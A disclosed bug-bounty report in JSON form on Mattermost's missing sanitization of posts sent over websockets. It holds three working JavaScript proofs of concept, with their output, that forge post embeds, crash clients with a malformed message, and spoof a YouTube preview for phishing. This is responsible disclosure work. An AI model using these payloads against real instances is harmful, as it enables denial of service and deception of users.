{
  "id": 2541027,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTQxMDI3",
  "url": "https://hackerone.com/reports/2541027",
  "title": "Posts sent via websockets aren't sanitized properly",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2024-06-07T13:04:32.448Z",
  "submitted_at": "2024-06-07T13:04:32.644Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "c0rydoras",
    "url": "/c0rydoras",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35268,
    "url": "https://hackerone.com/mattermost",
    "handle": "mattermost",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/268/9c24022b929e7fae94799068cf956f5c69d3ea15_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Mattermost",
      "twitter_handle": "Mattermost",
      "website": "https://mattermost.com",
      "about": "Open-source collaboration, self-managed or SaaS"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2024-47003"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-10-01T12:28:41.076Z",
  "bug_reporter_agreed_on_going_public_at": "2024-09-27T07:43:31.521Z",
  "team_member_agreed_on_going_public_at": "2024-10-01T12:28:40.814Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Posts aren't sanitized the same way when sent via Websockets as they are when saved to the database.\n\n\n## Example 1 - Permalink embed with fully customizable content\n### Code\n```javascript\nconst MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;\nconst MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;\nconst MM_USER_ID = process.env.MM_USER_ID;\nconst MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post\n\nconst MM_TARGET_ID = \"96nffx8oztncuyyxq7nj7p8seh\"; // ID of a post, which the embed will target\nconst MM_SHOWN_USER_ID = \"teur4prbifnh7dhq5rh3cp7q4c\"; // the user shown in the embed, in this example its the userid of system\n\nconst metadata = ({\n    embeds: [\n      {\n        type: \"permalink\",\n        data: {\n          post_id: MM_TARGET_ID,\n          post: {\n            id: MM_TARGET_ID,\n            user_id: MM_SHOWN_USER_ID,\n            channel_id: \"doesnt-matter\",\n            root_id: \"\",\n            original_id: \"\",\n            message: 'This can be whatever i want',\n            type: \"\",\n            props: {},\n            hashtags: \"\",\n            reply_count: 0,\n            last_reply_at: 0,\n            participants: [],\n            metadata: {},\n          },\n          team_name: \"\",\n          channel_display_name: \"can-be-anything-i-want\",\n          channel_type: \"O\",\n          channel_id: \"\",\n        },\n      },\n    ],\n})\n\nconst body = JSON.stringify({\n  file_ids: [],\n  message: \"\",\n  props: {\n    previewed_post: MM_TARGET_ID,\n  },\n  channel_id: MM_CHANNEL_ID,\n  user_id: MM_USER_ID,\n  metadata,\n});\n\nconst resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {\n  headers: {\n    \"Content-Type\": \"application/json\",\n    Authorization: `Bearer ${MM_AUTH_TOKEN}`,\n  },\n  method: \"POST\",\n  body,\n});\n\nconsole.log(JSON.stringify(await resp.json(), null, 4));\n```\n\n### Received Data from WS Connection\n```json\n{\"event\":\"posted\",\"data\":{\"channel_display_name\":\"@arthurd\",\"channel_name\":\"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa\",\"channel_type\":\"D\",\"mentions\":\"[\\\"w1bycrx7apy3xn31j7dyszahfa\\\"]\",\"post\":\"{\\\"id\\\":\\\"ju9uuu3xnjy1pymrp8siyk3t1o\\\",\\\"create_at\\\":1717763281641,\\\"update_at\\\":1717763281641,\\\"edit_at\\\":0,\\\"delete_at\\\":0,\\\"is_pinned\\\":false,\\\"user_id\\\":\\\"1wt8aoiskjg99dap81jx4zjejc\\\",\\\"channel_id\\\":\\\"ucatpix4girt5rp3w4xunng14o\\\",\\\"root_id\\\":\\\"\\\",\\\"original_id\\\":\\\"\\\",\\\"message\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"props\\\":{\\\"previewed_post\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\"},\\\"hashtags\\\":\\\"\\\",\\\"pending_post_id\\\":\\\"\\\",\\\"reply_count\\\":0,\\\"last_reply_at\\\":0,\\\"participants\\\":null,\\\"metadata\\\":{\\\"embeds\\\":[{\\\"type\\\":\\\"permalink\\\",\\\"data\\\":{\\\"channel_display_name\\\":\\\"can-be-anything-i-want\\\",\\\"channel_id\\\":\\\"\\\",\\\"channel_type\\\":\\\"O\\\",\\\"post\\\":{\\\"channel_id\\\":\\\"doesnt-matter\\\",\\\"hashtags\\\":\\\"\\\",\\\"id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"last_reply_at\\\":0,\\\"message\\\":\\\"This can be whatever i want\\\",\\\"metadata\\\":{},\\\"original_id\\\":\\\"\\\",\\\"participants\\\":[],\\\"props\\\":{},\\\"reply_count\\\":0,\\\"root_id\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"user_id\\\":\\\"teur4prbifnh7dhq5rh3cp7q4c\\\"},\\\"post_id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"team_name\\\":\\\"\\\"}}]}}\",\"sender_name\":\"@arthurd\",\"set_online\":true,\"should_ack\":true,\"team_id\":\"\"},\"broadcast\":{\"omit_users\":null,\"user_id\":\"w1bycrx7apy3xn31j7dyszahfa\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"team_id\":\"\",\"connection_id\":\"\",\"omit_connection_id\":\"\"},\"seq\":10}\n```\n\n### Resulting Post\n{F3339043}\n\n### Get request to post\n```json\n{\"id\":\"ju9uuu3xnjy1pymrp8siyk3t1o\",\"create_at\":1717763281641,\"update_at\":1717763281641,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{\"previewed_post\":\"96nffx8oztncuyyxq7nj7p8seh\"},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{}}\n```\n\n## Example 2 - DoS via non-string message using permalink embed\n\n### Code\n```javascript\nconst MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;\nconst MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;\nconst MM_USER_ID = process.env.MM_USER_ID;\nconst MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post\n\nconst MM_TARGET_ID = \"96nffx8oztncuyyxq7nj7p8seh\"; // ID of a post, which the embed will target\nconst MM_SHOWN_USER_ID = \"teur4prbifnh7dhq5rh3cp7q4c\"; // the user shown in the embed, in this example its the userid of system\n\nconst metadata = ({\n    embeds: [\n      {\n        type: \"permalink\",\n        data: {\n          post_id: MM_TARGET_ID,\n          post: {\n            id: MM_TARGET_ID,\n            user_id: MM_SHOWN_USER_ID,\n            channel_id: \"doesnt-matter\",\n            root_id: \"\",\n            original_id: \"\",\n            message: ['This will crash your webapp/desktop app'],\n            type: \"\",\n            props: {},\n            hashtags: \"\",\n            reply_count: 0,\n            last_reply_at: 0,\n            participants: [],\n            metadata: {},\n          },\n          team_name: \"\",\n          channel_display_name: \"can-be-anything-i-want\",\n          channel_type: \"O\",\n          channel_id: \"\",\n        },\n      },\n    ],\n})\n\nconst body = JSON.stringify({\n  file_ids: [],\n  message: \"\",\n  props: {\n    previewed_post: MM_TARGET_ID,\n  },\n  channel_id: MM_CHANNEL_ID,\n  user_id: MM_USER_ID,\n  metadata,\n});\n\nconst resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {\n  headers: {\n    \"Content-Type\": \"application/json\",\n    Authorization: `Bearer ${MM_AUTH_TOKEN}`,\n  },\n  method: \"POST\",\n  body,\n});\n\nconsole.log(JSON.stringify(await resp.json(), null, 4));\n```\n### Received Data from websocket connection\n```json\n{\"event\":\"posted\",\"data\":{\"channel_display_name\":\"@arthurd\",\"channel_name\":\"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa\",\"channel_type\":\"D\",\"mentions\":\"[\\\"w1bycrx7apy3xn31j7dyszahfa\\\"]\",\"post\":\"{\\\"id\\\":\\\"zsx67zqb8frh3knprgon4k1azc\\\",\\\"create_at\\\":1717763588738,\\\"update_at\\\":1717763588738,\\\"edit_at\\\":0,\\\"delete_at\\\":0,\\\"is_pinned\\\":false,\\\"user_id\\\":\\\"1wt8aoiskjg99dap81jx4zjejc\\\",\\\"channel_id\\\":\\\"ucatpix4girt5rp3w4xunng14o\\\",\\\"root_id\\\":\\\"\\\",\\\"original_id\\\":\\\"\\\",\\\"message\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"props\\\":{\\\"previewed_post\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\"},\\\"hashtags\\\":\\\"\\\",\\\"pending_post_id\\\":\\\"\\\",\\\"reply_count\\\":0,\\\"last_reply_at\\\":0,\\\"participants\\\":null,\\\"metadata\\\":{\\\"embeds\\\":[{\\\"type\\\":\\\"permalink\\\",\\\"data\\\":{\\\"channel_display_name\\\":\\\"can-be-anything-i-want\\\",\\\"channel_id\\\":\\\"\\\",\\\"channel_type\\\":\\\"O\\\",\\\"post\\\":{\\\"channel_id\\\":\\\"doesnt-matter\\\",\\\"hashtags\\\":\\\"\\\",\\\"id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"last_reply_at\\\":0,\\\"message\\\":[\\\"This will crash your webapp/desktop app\\\"],\\\"metadata\\\":{},\\\"original_id\\\":\\\"\\\",\\\"participants\\\":[],\\\"props\\\":{},\\\"reply_count\\\":0,\\\"root_id\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"user_id\\\":\\\"teur4prbifnh7dhq5rh3cp7q4c\\\"},\\\"post_id\\\":\\\"96nffx8oztncuyyxq7nj7p8seh\\\",\\\"team_name\\\":\\\"\\\"}}]}}\",\"sender_name\":\"@arthurd\",\"set_online\":true,\"should_ack\":true,\"team_id\":\"\"},\"broadcast\":{\"omit_users\":null,\"user_id\":\"w1bycrx7apy3xn31j7dyszahfa\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"team_id\":\"\",\"connection_id\":\"\",\"omit_connection_id\":\"\"},\"seq\":14}\n```\n\n### Impact\n{F3339055}\n{F3339056}\n(dead web application, requires restart)\n\nIts important to note that users don't have to be on the channel where the malicious embed is, naviagting there without refreshing the website/desktopapp still ends up in a white page.\n\nMore importantly, one can send embeds with valid messages in multiple channels, then when one post changes the embed e.g. different message, that happens for all occurences, so one could create valid embeds in a couple channels e.g. town-square, off-topic and more, then one with an invalid message and all of those channels now result in a whitepage (crash) for webapp/desktopap users.\n\n### Get request of post\n```json\n{\"id\":\"zsx67zqb8frh3knprgon4k1azc\",\"create_at\":1717763588738,\"update_at\":1717763588738,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{\"previewed_post\":\"96nffx8oztncuyyxq7nj7p8seh\"},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{}}\n```\n\n## Example 3 - Youtube Embed with different link\n\n### Code\n```javascript\nconst MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;\nconst MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;\nconst MM_USER_ID = process.env.MM_USER_ID;\nconst MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post\n\nconst TARGET_URL = \"https://github.com/c0rydoras\";\n\nconst metadata = {\n  embeds: [\n    {\n      type: \"opengraph\",\n      url: `${TARGET_URL}?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ`,\n      data: {\n        type: \"video.other\",\n        url: \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\n        title: \"Rick Astley - Never Gonna Give You Up (Official Music Video)\",\n        description:\n          \"The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...\",\n        determiner: \"\",\n        site_name: \"YouTube\",\n        locale: \"\",\n        locales_alternate: null,\n        images: [\n          {\n            url: \"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\",\n            secure_url: \"\",\n            type: \"\",\n            width: 1280,\n            height: 720,\n          },\n        ],\n        audios: null,\n        videos: null,\n      },\n    },\n  ],\n  images: {\n    \"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\": {\n      width: 1280,\n      height: 720,\n      format: \"jpeg\",\n      frame_count: 0,\n    },\n  },\n};\n\nconst body = JSON.stringify({\n  file_ids: [],\n  message: \"\",\n  channel_id: MM_CHANNEL_ID,\n  user_id: MM_USER_ID,\n  metadata,\n});\n\nconst resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {\n  headers: {\n    \"Content-Type\": \"application/json\",\n    Authorization: `Bearer ${MM_AUTH_TOKEN}`,\n  },\n  method: \"POST\",\n  body,\n});\n\nconsole.log(JSON.stringify(await resp.json(), null, 4));\n```\n\n### Received data from websocket connection\n```json\n{\"event\":\"posted\",\"data\":{\"channel_display_name\":\"@arthurd\",\"channel_name\":\"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa\",\"channel_type\":\"D\",\"mentions\":\"[\\\"w1bycrx7apy3xn31j7dyszahfa\\\"]\",\"post\":\"{\\\"id\\\":\\\"rpaioun83fds5ppf78bstpp3pw\\\",\\\"create_at\\\":1717764679114,\\\"update_at\\\":1717764679114,\\\"edit_at\\\":0,\\\"delete_at\\\":0,\\\"is_pinned\\\":false,\\\"user_id\\\":\\\"1wt8aoiskjg99dap81jx4zjejc\\\",\\\"channel_id\\\":\\\"ucatpix4girt5rp3w4xunng14o\\\",\\\"root_id\\\":\\\"\\\",\\\"original_id\\\":\\\"\\\",\\\"message\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"props\\\":{},\\\"hashtags\\\":\\\"\\\",\\\"pending_post_id\\\":\\\"\\\",\\\"reply_count\\\":0,\\\"last_reply_at\\\":0,\\\"participants\\\":null,\\\"metadata\\\":{\\\"embeds\\\":[{\\\"type\\\":\\\"opengraph\\\",\\\"url\\\":\\\"https://github.com/c0rydoras?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ\\\",\\\"data\\\":{\\\"audios\\\":null,\\\"description\\\":\\\"The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...\\\",\\\"determiner\\\":\\\"\\\",\\\"images\\\":[{\\\"height\\\":720,\\\"secure_url\\\":\\\"\\\",\\\"type\\\":\\\"\\\",\\\"url\\\":\\\"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\\\",\\\"width\\\":1280}],\\\"locale\\\":\\\"\\\",\\\"locales_alternate\\\":null,\\\"site_name\\\":\\\"YouTube\\\",\\\"title\\\":\\\"Rick Astley - Never Gonna Give You Up (Official Music Video)\\\",\\\"type\\\":\\\"video.other\\\",\\\"url\\\":\\\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\\\",\\\"videos\\\":null}}]}}\",\"sender_name\":\"@arthurd\",\"set_online\":true,\"should_ack\":true,\"team_id\":\"\"},\"broadcast\":{\"omit_users\":null,\"user_id\":\"\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"team_id\":\"\",\"connection_id\":\"\",\"omit_connection_id\":\"\"},\"seq\":4}\n```\n\n### Rendered Post\n{F3339087}\n{F3339088}\n\nThe name and other values are also customizable\n{F3339089}\n\n### Get request of post\n```json\n{\"id\":\"rpaioun83fds5ppf78bstpp3pw\",\"create_at\":1717764679114,\"update_at\":1717764679114,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{}}\n```\n\n## Impact\n\nThis can be abused in several ways. Here are some I found, i'm sure theres a lot more.\n- CWE-405 by having a very large payload (e.g. a lot of things in metadata), can take down server (similar to CVE\\-2024-24988)\n- DoS by sending  a permalink embed with a `message` that isn't a string\n- Lots of ways for phishing e.g. Youtube embed that can be freely customized\n- False Permalink embeds of posts that don't exist with freely customizable channel, user, time, message",
  "bounty_amount": "150.0",
  "formatted_bounty": "$150",
  "weakness": {
    "id": 107,
    "name": "Improper Input Validation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 3339043,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/lsf9qh518pc18uj82whzo30jpbxa?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H4AV6WS%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T180525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAum5gA9n0OhwNjaJnXmgaOH356uPjfQtutefi9s%2FVkeAiEAmU8uKGEAWtTFZtjIrKTW3793xxguLKe%2FmSxaH8ECZRcquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO%2FfHip2wAKwSj7BkyqPBTlFlyss9iCw9mK7SQFAuBHDDDXXX2DjNetK7kFwZijWIL6LbNUuji4J354mT6D8ToTjsQqkBhPxB6YQr4Z3WH8lOVOgx27vS5ubetT4kUp1QFhcjp0vaQqcMWm3SxSYdJjE%2FnOMbUenHrrY9t%2BlaBMUYd1c46KqZsXk9DoycIZmWr9UREuZQ2M5CKYV584Gr8AiuOVdKIhwRK6b6AY8K0eliXMlsrHL771mFBPGYLHjMweBxhHQzpSG0B41tVPuCoVIpaFpU5R02GrCjvW5kH5%2Flt%2BIe0OP%2B2pnJ24qjVBcxAGiNSigkrtUMmOtMCIOs%2Fn9FWQfq8YvEfTuNpDa8%2Fq6ODNTJFAusMJ8OFkAMTmfEKMEnQqupoq3LQWgvyhmhnsQttRQbw%2F3ptn6xmeMT93NzGxO9EGyuYbSsJjtVvsKz3zyylPTorWlzbgItq%2FEqmLKW3o%2BjV8iNxr7Z8871slspSL31o8IIKet9QuxYw0LEctmAfjaVXwkv%2F5jYoanq6I5q0v5b2NLA2TAsdxqKtzgy1Mwwwk35UHr0Da3knQlwdNhrwK6Ae2w2k41a%2Fy38ee%2FY1BTMkW6a9uLubBh8KWxhy%2FpWbcSO9emVrSfvxcL7ufE%2FdM%2FkJJkhEb6uQfLM5ySxvj4qWyVCNS7ZHVba1Awl4TGGklQGJ1sTJpWUEuXXSgpUjA6CwH9MdsMOYdk8spSfolISDgIhIA5ZmuNgydVITvTGDTvPRq4URdPcf8PglGIGYvB5Fg9gDRnSVBFhLOYfkrAKCEfGCx8NP6RkBnBSH8Vom4294LU2%2B6jpYoMDqWZwKLymfeH%2B2Ly0JxQtS6w7wWCll7774aFeE6WzSfcr8NrSlRzuknYZAfx%2FU8wrJW7xgY6sQFfjMR5GNfYKRzq3e2SZ4aV2ALT5cAq6qadBqqo5IXAugW3wFm3H4UCjPFMWuXw7kBa7261tkMA4lz9PtSK0dHwEUXAnotQfaCf9kwHyr1L0OVZ5yguv%2FCRrzXXUvYbqhQuTSXm4wAdzabaA5tjTkNJBV%2Bs8aR8iPFpfYv8ka7DLsuA8ks%2BUY7h1GsAJzVvGfO2LIsS%2F5pK27ULuiUYk7dQrn3KbZylZnnRvrpMIZ2J9O4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=36bf77ec29dc687edefa58d5d230102da25c25be53ecfb406be8ccfe4961720d",
      "file_size": 10152,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 3339055,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fr8nfy7ho3gydn186vszoyv3e9vc?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H4AV6WS%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T180525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAum5gA9n0OhwNjaJnXmgaOH356uPjfQtutefi9s%2FVkeAiEAmU8uKGEAWtTFZtjIrKTW3793xxguLKe%2FmSxaH8ECZRcquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO%2FfHip2wAKwSj7BkyqPBTlFlyss9iCw9mK7SQFAuBHDDDXXX2DjNetK7kFwZijWIL6LbNUuji4J354mT6D8ToTjsQqkBhPxB6YQr4Z3WH8lOVOgx27vS5ubetT4kUp1QFhcjp0vaQqcMWm3SxSYdJjE%2FnOMbUenHrrY9t%2BlaBMUYd1c46KqZsXk9DoycIZmWr9UREuZQ2M5CKYV584Gr8AiuOVdKIhwRK6b6AY8K0eliXMlsrHL771mFBPGYLHjMweBxhHQzpSG0B41tVPuCoVIpaFpU5R02GrCjvW5kH5%2Flt%2BIe0OP%2B2pnJ24qjVBcxAGiNSigkrtUMmOtMCIOs%2Fn9FWQfq8YvEfTuNpDa8%2Fq6ODNTJFAusMJ8OFkAMTmfEKMEnQqupoq3LQWgvyhmhnsQttRQbw%2F3ptn6xmeMT93NzGxO9EGyuYbSsJjtVvsKz3zyylPTorWlzbgItq%2FEqmLKW3o%2BjV8iNxr7Z8871slspSL31o8IIKet9QuxYw0LEctmAfjaVXwkv%2F5jYoanq6I5q0v5b2NLA2TAsdxqKtzgy1Mwwwk35UHr0Da3knQlwdNhrwK6Ae2w2k41a%2Fy38ee%2FY1BTMkW6a9uLubBh8KWxhy%2FpWbcSO9emVrSfvxcL7ufE%2FdM%2FkJJkhEb6uQfLM5ySxvj4qWyVCNS7ZHVba1Awl4TGGklQGJ1sTJpWUEuXXSgpUjA6CwH9MdsMOYdk8spSfolISDgIhIA5ZmuNgydVITvTGDTvPRq4URdPcf8PglGIGYvB5Fg9gDRnSVBFhLOYfkrAKCEfGCx8NP6RkBnBSH8Vom4294LU2%2B6jpYoMDqWZwKLymfeH%2B2Ly0JxQtS6w7wWCll7774aFeE6WzSfcr8NrSlRzuknYZAfx%2FU8wrJW7xgY6sQFfjMR5GNfYKRzq3e2SZ4aV2ALT5cAq6qadBqqo5IXAugW3wFm3H4UCjPFMWuXw7kBa7261tkMA4lz9PtSK0dHwEUXAnotQfaCf9kwHyr1L0OVZ5yguv%2FCRrzXXUvYbqhQuTSXm4wAdzabaA5tjTkNJBV%2Bs8aR8iPFpfYv8ka7DLsuA8ks%2BUY7h1GsAJzVvGfO2LIsS%2F5pK27ULuiUYk7dQrn3KbZylZnnRvrpMIZ2J9O4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f9f838a9f9cd96783bb1e66f4049cb649b18f5dd97665749333f02e0873d1f54",
      "file_size": 24462,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 3339056,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1w13h9ciav3woecbkstgfldp0dt9?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H4AV6WS%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T180525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAum5gA9n0OhwNjaJnXmgaOH356uPjfQtutefi9s%2FVkeAiEAmU8uKGEAWtTFZtjIrKTW3793xxguLKe%2FmSxaH8ECZRcquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO%2FfHip2wAKwSj7BkyqPBTlFlyss9iCw9mK7SQFAuBHDDDXXX2DjNetK7kFwZijWIL6LbNUuji4J354mT6D8ToTjsQqkBhPxB6YQr4Z3WH8lOVOgx27vS5ubetT4kUp1QFhcjp0vaQqcMWm3SxSYdJjE%2FnOMbUenHrrY9t%2BlaBMUYd1c46KqZsXk9DoycIZmWr9UREuZQ2M5CKYV584Gr8AiuOVdKIhwRK6b6AY8K0eliXMlsrHL771mFBPGYLHjMweBxhHQzpSG0B41tVPuCoVIpaFpU5R02GrCjvW5kH5%2Flt%2BIe0OP%2B2pnJ24qjVBcxAGiNSigkrtUMmOtMCIOs%2Fn9FWQfq8YvEfTuNpDa8%2Fq6ODNTJFAusMJ8OFkAMTmfEKMEnQqupoq3LQWgvyhmhnsQttRQbw%2F3ptn6xmeMT93NzGxO9EGyuYbSsJjtVvsKz3zyylPTorWlzbgItq%2FEqmLKW3o%2BjV8iNxr7Z8871slspSL31o8IIKet9QuxYw0LEctmAfjaVXwkv%2F5jYoanq6I5q0v5b2NLA2TAsdxqKtzgy1Mwwwk35UHr0Da3knQlwdNhrwK6Ae2w2k41a%2Fy38ee%2FY1BTMkW6a9uLubBh8KWxhy%2FpWbcSO9emVrSfvxcL7ufE%2FdM%2FkJJkhEb6uQfLM5ySxvj4qWyVCNS7ZHVba1Awl4TGGklQGJ1sTJpWUEuXXSgpUjA6CwH9MdsMOYdk8spSfolISDgIhIA5ZmuNgydVITvTGDTvPRq4URdPcf8PglGIGYvB5Fg9gDRnSVBFhLOYfkrAKCEfGCx8NP6RkBnBSH8Vom4294LU2%2B6jpYoMDqWZwKLymfeH%2B2Ly0JxQtS6w7wWCll7774aFeE6WzSfcr8NrSlRzuknYZAfx%2FU8wrJW7xgY6sQFfjMR5GNfYKRzq3e2SZ4aV2ALT5cAq6qadBqqo5IXAugW3wFm3H4UCjPFMWuXw7kBa7261tkMA4lz9PtSK0dHwEUXAnotQfaCf9kwHyr1L0OVZ5yguv%2FCRrzXXUvYbqhQuTSXm4wAdzabaA5tjTkNJBV%2Bs8aR8iPFpfYv8ka7DLsuA8ks%2BUY7h1GsAJzVvGfO2LIsS%2F5pK27ULuiUYk7dQrn3KbZylZnnRvrpMIZ2J9O4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=562571481066cf43e9d87cf711537370c6cb48c2c16aa8adbfcd7cf4598cb093",
      "file_size": 3350,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 3339087,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/w2lim3vpapw0m2a53w9hno7o741y?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H4AV6WS%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T180525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHgaCXVzLXdlc3QtMiJHMEUCIAum5gA9n0OhwNjaJnXmgaOH356uPjfQtutefi9s%2FVkeAiEAmU8uKGEAWtTFZtjIrKTW3793xxguLKe%2FmSxaH8ECZRcquwUI8f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDO%2FfHip2wAKwSj7BkyqPBTlFlyss9iCw9mK7SQFAuBHDDDXXX2DjNetK7kFwZijWIL6LbNUuji4J354mT6D8ToTjsQqkBhPxB6YQr4Z3WH8lOVOgx27vS5ubetT4kUp1QFhcjp0vaQqcMWm3SxSYdJjE%2FnOMbUenHrrY9t%2BlaBMUYd1c46KqZsXk